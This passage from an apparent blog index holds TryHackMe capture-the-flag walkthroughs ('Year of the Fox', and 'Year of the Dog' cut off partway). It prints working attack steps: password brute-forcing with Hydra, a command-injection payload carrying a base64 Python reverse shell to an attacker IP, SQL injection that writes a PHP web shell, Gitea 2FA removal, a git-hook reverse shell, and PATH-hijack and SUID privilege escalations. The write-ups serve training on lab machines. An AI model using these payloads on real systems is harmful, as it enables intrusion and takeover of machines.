20230907145524_8375b2fd144a49a3bfa8bc0b289462fb.trn| 20230907145524_94ec144dd2034f1f9159e8b7e192b058.trn| 20230907145548_41d0c74b997b47e892da107feea41166.trn| 20230907145548_43d9a351377141078596efec7433284e.trn| 20230907145548_c654bfec8cf74af8b113fa1eee8d1816.trn| +---.ssh| known_hosts| +---3D Objects+---Contacts+---Desktop| root.txt| +---Documents| +---installers| +---scripts| | cleaner.bat| | vm_comp.ps1| | | +---vms| | LinuxServer.vhd| | | \\---WindowsPowerShell| \\---Scripts| \\---InstalledScriptInfos+---Downloads| python-3.12.0-amd64.exe| +---ExchangeLanguagePack+---Favorites| | Bing.url| | | \\---Links+---Links| Desktop.lnk| Downloads.lnk| +---Music+---Pictures+---Saved Games+---Searches\\---VideosC:\\Users\\Administrator>type Desktop\\root.txt25199da887b48115d7e13fc8dc80d2e9C:\\Users\\Administrator>```{: .nolineno}I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.> Thank You ! {: .prompt-tip }" }, { "title": "Year Of The Fox", "url": "/posts/Year-of-the-Fox/", "categories": "TryHackMe", "tags": "PrivEsc, Port Forwording, socat, shutdown, Password Bruteforce", "date": "2024-03-24 00:00:00 +0530", "snippet": "| Machine Link | [https://tryhackme.com/r/room/yotf](https://tryhackme.com/r/room/yotf) || ------------------ | ---------------------------------------------------------------------- || Opera...", "content": "| Machine Link | [https://tryhackme.com/r/room/yotf](https://tryhackme.com/r/room/yotf) || ------------------ | ---------------------------------------------------------------------- || Operating System | Linux || Difficulty | Hard || Machine Created by | [MuirlandOracle](https://tryhackme.com/p/MuirlandOracle) |## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/yotf]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.10.81.15[sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-21 12:56 ISTNmap scan report for 10.10.81.15Host is up (0.17s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.29|_http-title: 401 Unauthorized|_http-server-header: Apache/2.4.29 (Ubuntu)| http-auth: | HTTP/1.1 401 Unauthorized\\x0D|_ Basic realm=You want in? Gotta guess the password!43777/tcp filtered unknownService Info: Host: year-of-the-fox.lanService detection performed.```{: .nolineno}## Web Enumeration â¤µï¸Since I got the Login-page first while loading the port 80 :and I donâ€™t have the credentials so I enumerated the SMB shares with a Tools called as enum4linux â¤µï¸ ```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/yotf]â””â”€$ enum4linux -a 10.10.81.15 Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Sep 21 13:00:46 2023 =========================================( Target Information )==================================Target ........... 10.10.81.15RID Range ........ 500-550,1000-1050Username ......... ''Password ......... ''Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ============================( Enumerating Workgroup/Domain on 10.10.81.15 )=====================[+] Got domain/workgroup name: YEAROFTHEFOX ================================( Nbtstat Information for 10.10.81.15 )=========================Looking up status of 10.10.81.15\tYEAR-OF-THE-FOX - B Workstation Service\tYEAR-OF-THE-FOX - B Messenger Service\tYEAR-OF-THE-FOX - B File Server Service\t..__MSBROWSE__. - B Master Browser\tYEAROFTHEFOX - B Domain/Workgroup Name\tYEAROFTHEFOX - B Master Browser\tYEAROFTHEFOX - B Browser Service Elections\tMAC Address = 00-00-00-00-00-00 ====================================( Session Check on 10.10.81.15 )=============================[+] Server 10.10.81.15 allows sessions using username '', password '' =================================( Getting domain SID for 10.10.81.15 )==========================Domain Name: YEAROFTHEFOXDomain Sid: (NULL SID)[+] Cant determine if host is part of domain or part of a workgroup ===================================( OS information on 10.10.81.15 )============================[E] Cant get OS info with smbclient[+] Got OS info for 10.10.81.15 from srvinfo: \tYEAR-OF-THE-FOXWk Sv PrQ Unx NT SNT year-of-the-fox server (Samba, Ubuntu)\tplatform_id :\t500\tos version :\t6.1\tserver type :\t0x809a03 ========================================( Users on 10.10.81.15 )=================================index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: fox\tName: fox\tDesc: user:[fox] rid:[0x3e8] ==================================( Share Enumeration on 10.10.81.15 )===========================\tSharename Type Comment\t--------- ---- -------\tyotf Disk Foxs Stuff -- keep out!\tIPC$ IPC IPC Service (year-of-the-fox server (Samba, Ubuntu))Reconnecting with SMB1 for workgroup listing.\tServer Comment\t--------- -------\tWorkgroup Master\t--------- -------\tYEAROFTHEFOX YEAR-OF-THE-FOX[+] Attempting to map shares on 10.10.81.15//10.10.81.15/yotf\tMapping: DENIED Listing: N/A Writing: N/A[E] Cant understand response:NT_STATUS_OBJECT_NAME_NOT_FOUND listing \\*//10.10.81.15/IPC$\tMapping: N/A Listing: N/A Writing: N/A ============================( Password Policy Information for 10.10.81.15 )=====================[+] Attaching to 10.10.81.15 using a NULL share[+] Trying protocol 139/SMB...[+] Found domain(s):\t[+] YEAR-OF-THE-FOX\t[+] Builtin[+] Password Info for Domain: YEAR-OF-THE-FOX\t[+] Minimum password length: 5\t[+] Password history length: None\t[+] Maximum password age: 37 days 6 hours 21 minutes \t[+] Password Complexity Flags: 000000\t\t[+] Domain Refuse Password Change: 0\t\t[+] Domain Password Store Cleartext: 0\t\t[+] Domain Password Lockout Admins: 0\t\t[+] Domain Password No Clear Change: 0\t\t[+] Domain Password No Anon Change: 0\t\t[+] Domain Password Complex: 0\t[+] Minimum password age: None\t[+] Reset Account Lockout Counter: 30 minutes \t[+] Locked Account Duration: 30 minutes \t[+] Account Lockout Threshold: None\t[+] Forced Log off Time: 37 days 6 hours 21 minutes [+] Retieved partial password policy with rpcclient:Password Complexity: DisabledMinimum Password Length: 5 =======================================( Groups on 10.10.81.15 )================================[+] Getting builtin groups:[+] Getting builtin group memberships:[+] Getting local groups:[+] Getting local group memberships:[+] Getting domain groups:[+] Getting domain group memberships: ===================( Users on 10.10.81.15 via RID cycling (RIDS: 500-550,1000-1050) )============[I] Found new SID: S-1-22-1[I] Found new SID: S-1-5-32[I] Found new SID: S-1-5-32[I] Found new SID: S-1-5-32[I] Found new SID: S-1-5-32[+] Enumerating users using SID S-1-5-32 and logon username '', password ''S-1-5-32-544 BUILTIN\\Administrators (Local Group)S-1-5-32-545 BUILTIN\\Users (Local Group)S-1-5-32-546 BUILTIN\\Guests (Local Group)S-1-5-32-547 BUILTIN\\Power Users (Local Group)S-1-5-32-548 BUILTIN\\Account Operators (Local Group)S-1-5-32-549 BUILTIN\\Server Operators (Local Group)S-1-5-32-550 BUILTIN\\Print Operators (Local Group)[+] Enumerating users using SID S-1-22-1 and logon username '', password ''S-1-22-1-1000 Unix User\\fox (Local User)S-1-22-1-1001 Unix User\\rascal (Local User)[+] Enumerating users using SID S-1-5-21-978893743-2663913856-222388731 and logon username '', password ''S-1-5-21-978893743-2663913856-222388731-501 YEAR-OF-THE-FOX\\nobody (Local User)S-1-5-21-978893743-2663913856-222388731-513 YEAR-OF-THE-FOX\\None (Domain Group)S-1-5-21-978893743-2663913856-222388731-1000 YEAR-OF-THE-FOX\\fox (Local User) ================================( Getting printer info for 10.10.81.15 )=========================No printers returned.enum4linux complete on Thu Sep 21 13:13:48 2023```{: .nolineno}>Note : Each time you load this machine all the password gets changes .{: prompt-danger }I got 2 users mainly rascal and fox so I brute forced the password for Login page with user rascal and i got the results â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/yotf]â””â”€$ hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.17.75 http-get / -t 60Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-21 21:19:51[DATA] max 60 tasks per 1 server, overall 60 tasks, 14344399 login tries (l:1/p:14344399), ~239074 tries per task[DATA] attacking http-get://10.10.17.75:80/[STATUS] 5706.00 tries/min, 5706 tries in 00:01h, 14338693 to do in 41:53h, 60 active[STATUS] 5881.33 tries/min, 17644 tries in 00:03h, 14326755 to do in 40:36h, 60 active[80][http-get] host: 10.10.17.75 login: rascal password: 1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-21 21:23:08```{: .nolineno}Now I logged in and got a search page like this â†’![Untitled](picture1.png)Now with burpsuite I intercepted the request â†’![Untitled](picture2.png)_search parameter request_I founded the command injection possibility through pinging on my attackers machine like this â†’![Untitled](picture3.png)_Input replaced with command injection_Now I the payload of base 64 encode-decode one for reverse shell like this â†’```bash{\"target\":\"\\\";echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjguODMuMTU2Iiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsn | base64 -d | bash ;}```{: .nolineno}The base64 encode payload is this â†’```bashpython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.8.83.156\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'```{: .nolineno}Now I got the payload and the web flag â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/yotf]â””â”€$ nc -lvnp 4444 listening on [any] 4444 ...connect to [10.8.83.156] from (UNKNOWN) [10.10.17.75] 34996/bin/sh: 0: cant access tty; job control turned off$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@year-of-the-fox:/var/www/html/assets/php$ ^Zzsh: suspended nc -lvnp 4444 â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/yotf]â””â”€$ stty raw -echo ; fg ; reset ;[1] + continued nc -lvnp 4444www-data@year-of-the-fox:/var/www/html/assets/php$ www-data@year-of-the-fox:/var/www/html/assets/php$ cd /www-data@year-of-the-fox:/$ cd /tmpwww-data@year-of-the-fox:/tmp$ ls -altotal 8drwxrwxrwt 2 root root 4096 Sep 21 16:46 .drwxr-xr-x 22 root root 4096 May 29 2020 ..www-data@year-of-the-fox:/tmp$ www-data@year-of-the-fox:/tmp$ export TERM=xtermwww-data@year-of-the-fox:/tmp$```{: .nolineno}Now I checked the network interface to see what else is running and I got this â†’```bashwww-data@year-of-the-fox:/tmp$ ss -tunlp | grep 127.0.0.1tcp LISTEN 0 128 127.0.0.1:22 0.0.0.0:* www-data@year-of-the-fox:/tmp$```{: .nolineno}Since port 22 is running internally and not externally so lets check its ssh configuration file â†’```bashwww-data@year-of-the-fox:/tmp$ cat /etc/ssh/sshd_config #\t$OpenBSD: sshd_config,v 1.101 2017/03/14 07:19:07 djm Exp $# This is the sshd server system-wide configuration file. See# sshd_config(5) for more information.# This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin# The strategy used for options in the default sshd_config shipped with# OpenSSH is to specify options with their default value where# possible, but leave them commented. Uncommented options override the# default value.#Port 22#AddressFamily anyListenAddress 127.0.0.1 #ListenAddress ::......#\tPermitTTY no#\tForceCommand cvs serverAllowUsers foxwww-data@year-of-the-fox:/tmp$```{: .nolineno}I noted that the victim machine is actually runing the port 22 internally and the ssh login is Allowed for fox user so lets now access this port 22 externally and for that I need to perform port forwording with `port2port` and I will be using the simple tool called socat you can get the commands from [here](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding#socat). that lets me interact this 22 port with other port on externally so lets do it .Lets transfer the socat first like this â†’```bashwww-data@year-of-the-fox:/tmp$ wget http://10.8.83.156/socat_x86--2023-09-21 16:56:04-- http://10.8.83.156/socat_x86Connecting to 10.8.83.156:80... connected.HTTP request sent, awaiting response... 200 OKLength: 375176 (366K) [application/octet-stream]Saving to: 'socat_x86'socat_x86 100%[===================>] 366.38K 328KB/s in 1.1s 2023-09-21 16:56:06 (328 KB/s) - 'socat_x86' saved [375176/375176]www-data@year-of-the-fox:/tmp$ chmod +x *www-data@year-of-the-fox:/tmp$```{: .nolineno}Now lets morph this port 22 to 2222 on victim machine so that we can access this 22 port externally through 2222 port it will be done like this â¤µï¸ ```bashwww-data@year-of-the-fox:/tmp$ ./socat_x86 TCP-LISTEN:2222,reuseaddr,fork TCP:127.0.0.1:22 &[1] 1021www-data@year-of-the-fox:/tmp$```{: .nolineno}Now lets try to access the 2222 port from attackers machine like this â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/yotf]â””â”€$ ssh fox@10.10.167.224 -p 2222The authenticity of host '[10.10.167.224]:2222 ([10.10.167.224]:2222)' cant be established.ED25519 key fingerprint is SHA256:ytuC6e5+2EWnZLeockeugHFQMCmIRWlKFJR/MF8JPJo.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '[10.10.167.224]:2222' (ED25519) to the list of known hosts.fox@10.10.167.224s password:```{: .nolineno}I see , so I can access this port so lets brute force the password of user FOX which we want to connect to â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/yotf]â””â”€$ hydra -l fox -P /usr/share/wordlists/rockyou.txt 10.10.17.75 ssh -t 64 -s 2222Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-21 21:27:18[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task[DATA] attacking ssh://10.10.17.75:2222/[2222][ssh] host: 10.10.17.75 login: fox password: 1 of 1 target successfully completed, 1 valid password found[WARNING] Writing restore file because 16 final worker threads did not complete until end.[ERROR] 16 targets did not resolve or could not be connected[ERROR] 0 target did not completeHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-21 21:27:25```{: .nolineno}Now Its SSH Time â¤µï¸ ## SSH Login â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/yotf]â””â”€$ ssh fox@10.10.17.75 -p 2222 The authenticity of host '[10.10.17.75]:2222 ([10.10.17.75]:2222)' cant be established.ED25519 key fingerprint is SHA256:ytuC6e5+2EWnZLeockeugHFQMCmIRWlKFJR/MF8JPJo.This host key is known by the following other names/addresses: ~/.ssh/known_hosts:104: [hashed name]Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '[10.10.17.75]:2222' (ED25519) to the list of known hosts.fox@10.10.17.75s password: \t__ __ __ _ _ _____ \t\\ \\ / /__ __ _ _ __ ___ / _| | |_| |__ ___ | ___|____ __\t \\ V / _ \\/ _` | '__| / _ \\| |_ | __| '_ \\ / _ \\ | |_ / _ \\ \\/ /\t | | __/ (_| | | | (_) | _| | |_| | | | __/ | _| (_) > /dev/null-rw-r--r-- 1 fox fox 220 May 28 2020 .bash_logout-rw-r--r-- 1 fox fox 3771 May 28 2020 .bashrcdrwx------ 2 fox fox 4096 May 28 2020 .cachedrwx------ 3 fox fox 4096 May 28 2020 .gnupg-rw-r--r-- 1 fox fox 807 May 28 2020 .profiledrwxr-xr-x 2 fox fox 4096 Jun 20 2020 samba-rw-r--r-- 1 fox fox 0 May 28 2020 .sudo_as_admin_successful-rw-r--r-- 1 root root 38 May 31 2020 user-flag.txtfox@year-of-the-fox:~$ cat user-flag.txt THM{FLAG_FLAG_FLAG_FLAG_FLAG_FLAG}fox@year-of-the-fox:~$ sudo -lMatching Defaults entries for fox on year-of-the-fox: env_reset, mail_badpassUser fox may run the following commands on year-of-the-fox: (root) NOPASSWD: /usr/sbin/shutdownfox@year-of-the-fox:~$ echo /bin/bash > /tmp/powerofffox@year-of-the-fox:~$ chmod +x /tmp/powerofffox@year-of-the-fox:~$ export PATH=/tmp:$PATHfox@year-of-the-fox:~$ sudo /usr/sbin/shutdownroot@year-of-the-fox:~# whoamirootroot@year-of-the-fox:~# iduid=0(root) gid=0(root) groups=0(root)root@year-of-the-fox:~# cd /rootroot@year-of-the-fox:/root# ls -altotal 36drwx------ 5 root root 4096 Sep 21 16:46 .drwxr-xr-x 22 root root 4096 May 29 2020 ..lrwxrwxrwx 1 root root 9 May 28 2020 .bash_history -> /dev/null-rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrcdrwx------ 2 root root 4096 May 30 2020 .cachedrwx------ 3 root root 4096 May 30 2020 .gnupgdrwxr-xr-x 3 root root 4096 May 28 2020 .local-rw-r--r-- 1 root root 148 Aug 17 2015 .profile-rw-r--r-- 1 root root 21 May 31 2020 root.txt-rw-r--r-- 1 root root 75 May 31 2020 .selected_editorroot@year-of-the-fox:/root# cat root.txt Not here -- go find!root@year-of-the-fox:/root#root@year-of-the-fox:/root# cd /homeroot@year-of-the-fox:/home# lsfox rascalroot@year-of-the-fox:/home# cd rascalroot@year-of-the-fox:/home/rascal# ls -altotal 24drwxr-x--- 2 rascal rascal 4096 Jun 1 2020 .drwxr-xr-x 4 root root 4096 May 28 2020 ..lrwxrwxrwx 1 root root 9 May 28 2020 .bash_history -> /dev/null-rw-r--r-- 1 rascal rascal 220 Apr 4 2018 .bash_logout-rw-r--r-- 1 rascal rascal 3771 Apr 4 2018 .bashrc-r-------- 1 rascal root 158 Jun 9 2020 .did-you-think-I-was-useless.root-rw-r--r-- 1 rascal rascal 807 Apr 4 2018 .profileroot@year-of-the-fox:/home/rascal# cat .did-you-think-I-was-useless.root THM{FLAG_FLAG_FLAG_FLAG_FLAG_FLAG}Here is the prize:YTAyNzQ3ODZlMmE2MjcwNzg2NjZkNjQ2Nzc5NzA0NjY2Njc2NjY4M2I2OTMyMzIzNTNhNjk2ODMwMwo=Good luck!root@year-of-the-fox:/home/rascal#```{: .nolineno}>This machine mainly teaches me about Port Forwarding !!{: .prompt-tip }> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Year Of The Dog", "url": "/posts/Year-of-the-Dog/", "categories": "TryHackMe", "tags": "SQLi, gitea, RFI, SUIDs, PrivEsc, socat, Port Forwording", "date": "2024-03-23 00:00:00 +0530", "snippet": "| Machine Link | [https://tryhackme.com/r/room/yearofthedog](https://tryhackme.com/r/room/yearofthedog) || ------------------ | ---------------------------------------------------------------...", "content": "| Machine Link | [https://tryhackme.com/r/room/yearofthedog](https://tryhackme.com/r/room/yearofthedog) || ------------------ | -------------------------------------------------------------------------------------- || Operating System | Linux || Difficulty | Hard || Machine Created by | [MuirlandOracle](https://tryhackme.com/p/MuirlandOracle) |## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/yotd]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.10.237.188[sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-27 22:21 ISTNmap scan report for 10.10.237.188Host is up (0.18s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 e4:c9:dd:9b:db:95:9e:fd:19:a9:a6:0d:4c:43:9f:fa (RSA)| 256 c3:fc:10:d8:78:47:7e:fb:89:cf:81:8b:6e:f1:0a:fd (ECDSA)|_ 256 27:68:ff:ef:c0:68:e2:49:75:59:34:f2:bd:f0:c9:20 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Canis QueueService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸On port 80 I got a simple page â†’![Untitled](Untitled.png)with directory traversdal I also got a page called `config.php` file but cant access the php file so lets see this page behavior with burpsuite â†’![Untitled](Untitled%201.png)Tempering with cookies id I got a sql injection indication like this â†’![Untitled](Untitled%202.png)with sqli lets see how many column its database has â†’```sql1' UNION SELECT 1,2--+#OR1' ORDER BY 1,2--+#OR1' ORDER BY 2--+```{: .nolineno}![Untitled](Untitled%203.png)Trying anything else give me this error â†’![Untitled](Untitled%204.png)That is why I got confirmed that this database have 2 columns so lets try RCE on this column with this command â†’```sql' UNION SELECT 1,LOAD_FILE(\"/etc/passwd\") -- -```{: .nolineno}![Untitled](Untitled%205.png)I tried to read the `config.php` file that I got from directory or files bruteforcing so lets see â†’![Untitled](Untitled%206.png)This time lets try to do RFI (Remote File Inclusion) like this â†’```sql' UNION SELECT 1, INTO OUTFILE '/var/www/html/shell.php' -- -# '' OR WE CAN HEX ENCODE THE PAYLOAD FOR EXECUTION ALTERNATIVE WAY LIKE THIS â¤µï¸ 'UNION SELECT 1,0x3C3F7068702073797374656D28245F524551554553545B27636D64275D293B203F3E INTO OUTFILE '/var/www/html/shell2.php'-- -```{: .nolineno}with first method I got this error â†’![Untitled](Untitled%207.png)So lets try to upload the payload with hex encoded like above code .![Untitled](Untitled%208.png)Now lets try RFI execution on this page â†’![Untitled](Untitled%209.png)_RFI execution_Its time to get the shell with this RFI â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/yotd]â””â”€$ nc -lvnp 4444 listening on [any] 4444 ...connect to [10.8.83.156] from (UNKNOWN) [10.10.84.101] 56514/bin/sh: 0: cant access tty; job control turned off$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@year-of-the-dog:/var/www/html$ whoamiwhoamiwww-datawww-data@year-of-the-dog:/var/www/html$ ididuid=33(www-data) gid=33(www-data) groups=33(www-data)www-data@year-of-the-dog:/var/www/html$```{: .nolineno}## SSH SHELL â¤µï¸I checked the connections and got this â†’```bashwww-data@year-of-the-dog:/$ ss -tunlp | grep 127.0.0.1tcp LISTEN 0 80 127.0.0.1:3306 0.0.0.0:* tcp LISTEN 0 128 127.0.0.1:3000 0.0.0.0:* tcp LISTEN 0 128 127.0.0.1:34247 0.0.0.0:* www-data@year-of-the-dog:/$```{: .nolineno}I also found some data related to dylan user in this file `work_analysis` :```bashwww-data@year-of-the-dog:/home/dylan$ grep -r 'dylan' work_analysis Sep 5 20:52:57 staging-server sshd[39218]: Invalid user dylanLabr4d0rs4L1f3 from 192.168.1.142 port 45624Sep 5 20:53:03 staging-server sshd[39218]: Failed password for invalid user dylanLabr4d0rs4L1f3 from 192.168.1.142 port 45624 ssh2Sep 5 20:53:04 staging-server sshd[39218]: Connection closed by invalid user dylanLabr4d0rs4L1f3 192.168.1.142 port 45624 [preauth]www-data@year-of-the-dog:/home/dylan$www-data@year-of-the-dog:/home/dylan$ cat .gitconfig [user]\tname = Dylan\temail = dylan@yearofthedog.thmwww-data@year-of-the-dog:/home/dylan$```{: .nolineno}I think due to bruteforce of username:password for SSH the credetials leaked like this â†’```bashdylan:```{: .nolineno}Now I port forworded the port 3000 for external access with socat Tool â†’```bashwww-data@year-of-the-dog:/tmp$ wget http://10.8.83.156/socat_x86--2023-09-28 10:04:05-- http://10.8.83.156/socat_x86Connecting to 10.8.83.156:80... connected.HTTP request sent, awaiting response... 200 OKLength: 375176 (366K) [application/octet-stream]Saving to: 'socat_x86'socat_x86 100%[===================>] 366.38K 345KB/s in 1.1s 2023-09-28 10:04:06 (345 KB/s) - 'socat_x86' saved [375176/375176]www-data@year-of-the-dog:/tmp$ chmod +x *www-data@year-of-the-dog:/tmp$ ./socat_x86 TCP-LISTEN:2222,reuseaddr,fork TCP:127.0.0.1:3000 &[1] 1538www-data@year-of-the-dog:/tmp$```{: .nolineno}Now lets check if the port 2222 got open on victim machine â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/yotd]â””â”€$ sudo nmap -p 2222 10.10.39.160 [sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-28 14:34 ISTNmap scan report for 10.10.39.160Host is up (0.17s latency).PORT STATE SERVICE2222/tcp open EtherNetIP-1Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds```{: .nolineno}Now lets access this site on web browser â†’![Untitled](Untitled%2010.png)_gitea Dashboad_This port host the gitea in it , Lets try to login with the credentials or data that we have got from the Local Privilege Escalation â†’![Untitled](Untitled%2011.png)I need to enter this 2FA passcode and I donâ€™t have this access so lets try some thing else Like try to add a user having admin privileges and then transfer that file to that only `gitea.db` location :I registered a new user as `strongshiv8` â†’![Untitled](Untitled%2012.png)I can also port forward this with SSH command only like this ðŸ”½```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Year_of_the_dog]â””â”€$ ssh -L 3000:127.0.0.1:3000 dylan@10.10.142.78dylan@10.10.142.78s password: \t__ __ __ _ _ ____ \t\\ \\ / /__ __ _ _ __ ___ / _| | |_| |__ ___ | _ \\ \t \\ V / _ \\/ _` | '__| / _ \\| |_ | __| '_ \\ / _ \\ | | | |/ \t | | __/ (_| | | | (_) | _| | |_| | | | __/ | |_| | \t |_|\\___|\\__,_|_| \\___/|_| \\__|_| |_|\\___| |____/ dylan@year-of-the-dog:~$ whoamidylandylan@year-of-the-dog:~$ iduid=1000(dylan) gid=1000(dylan) groups=1000(dylan)dylan@year-of-the-dog:~$ ```{: .nolineno}Now as sqlite in not installed on this system so I transferred its database to attackers machine.To disable 2 factor Authentication from dylan account there is 2 way :1. You download the `gitea.db` file on attacker machine then delete the two_factor table from the database then re-upload the gitea file that will be good to go .2. Another way is to use this python script or say command to do so ðŸ”½```pythonimport sqlite3conn=sqlite3.connect('gitea.db')conn.execute('delete from two_factor')conn.commit()conn.close()```{: .nolineno}![Untitled](Untitled%2013.png)Lets re-login and see weather I am successfully accomplish my needs or not : ![Untitled](Untitled%2014.png)I can login successfully now without 2 factor Auth so lets enumerate further ðŸ”½![Untitled](Untitled%2015.png)I opened this git Hook option and added the reverse shell command in ***pre-receive*** you can choose any option that will work just fine.![Untitled](Untitled%2016.png)Now I have to alter the data of this repository by clonning it then adding some changes in **README.md** file after that pushing back to its repo that will trigger my reverse shell like this .```bashgit clone http://127.0.0.1:3000/Dylan/Test-Repocd Test-Repo/echo \"Reverse Shell Time \\!\" >> README.mdgit add README.mdgit commit -m \"Modified README.md file\"git pushUsername for 'http://127.0.0.1:3000': dylanPassword for 'http://dylan@127.0.0.1:3000': Everything up-to-date```{: .nolineno}After executing the last part I would get the reverse shell triggered like this â¬![Untitled](Untitled%2017.png)Reverse shell : ![Untitled](Untitled%2018.png)I checked its root prvileges and I got full access â¬```bash/data/git $ sudo -lUser git may run the following commands on 42040a8f97fc: (ALL) NOPASSWD: ALL/data/git $```{: .nolineno}So I am root now : ```bash/data/git $ sudo -swhoamiroot/bin/bash -ibash: cannot set terminal process group (16): Not a ttybash: no job control in this shellbash-5.0#```{: .nolineno}Now for root in victim machine I need to transfer the victim machine bash file into the git shell or directory so that it can get the SUIDs permission from git root shell and that will work as effective SUID root for victim machine like this ðŸ”» ```bashdylan@year-of-the-dog:/gitea/gitea$ cp /bin/bash .dylan@year-of-the-dog:/gitea/gitea$ ls -altotal 2312drwxr-xr-x 9 dylan dylan 4096 Mar 23 06:34 .drwxr-xr-x 5 root root 4096 Sep 5 2020 ..drwxr-xr-x 2 dylan dylan 4096 Sep 5 2020 attachmentsdrwxr-xr-x 2 dylan dylan 4096 Sep 5 2020 avatars-rwxr-xr-x 1 dylan dylan 1113504 Mar 23 06:34 bashdrwxr-xr-x 2 dylan dylan 4096 Sep 5 2020 conf-rw-r--r-- 1 dylan dylan 1212416 Mar 23 05:57 gitea.dbdrwxr-xr-x 4 dylan dylan 4096 Sep 5 2020 indexersdrwxr-xr-x 2 dylan dylan 4096 Sep 6 2020 logdrwxr-xr-x 6 dylan dylan 4096 Sep 5 2020 queuesdrwx------ 7 dylan dylan 4096 Mar 23 05:31 sessionsdylan@year-of-the-dog:/gitea/gitea$```{: .nolineno}Now I have to own this file as root and give it SUIDs permissions like this â¬```bashbash-5.0# ls -alls -altotal 2312drwxr-xr-x 9 git git 4096 Mar 23 06:34 .drwxr-xr-x 5 root root 4096 Sep 5 2020 ..drwxr-xr-x 2 git git 4096 Sep 5 2020 attachmentsdrwxr-xr-x 2 git git 4096 Sep 5 2020 avatars-rwxr-xr-x 1 git git 1113504 Mar 23 06:34 bashdrwxr-xr-x 2 git git 4096 Sep 5 2020 conf-rw-r--r-- 1 git git 1212416 Mar 23 05:57 gitea.dbdrwxr-xr-x 4 git git 4096 Sep 5 2020 indexersdrwxr-xr-x 2 git git 4096 Sep 6 2020 logdrwxr-xr-x 6 git git 4096 Sep 5 2020 queuesdrwx------ 7 git git 4096 Mar 23 05:31 sessionsbash-5.0# chown root:root bashchown root:root bashbash-5.0# ls -alls -altotal 2312drwxr-xr-x 9 git git 4096 Mar 23 06:34 .drwxr-xr-x 5 root root 4096 Sep 5 2020 ..drwxr-xr-x 2 git git 4096 Sep 5 2020 attachmentsdrwxr-xr-x 2 git git 4096 Sep 5 2020 avatars-rwxr-xr-x 1 root root 1113504 Mar 23 06:34 bashdrwxr-xr-x 2 git git 4096 Sep 5 2020 conf-rw-r--r-- 1 git git 1212416 Mar 23 05:57 gitea.dbdrwxr-xr-x 4 git git 4096 Sep 5 2020 indexersdrwxr-xr-x 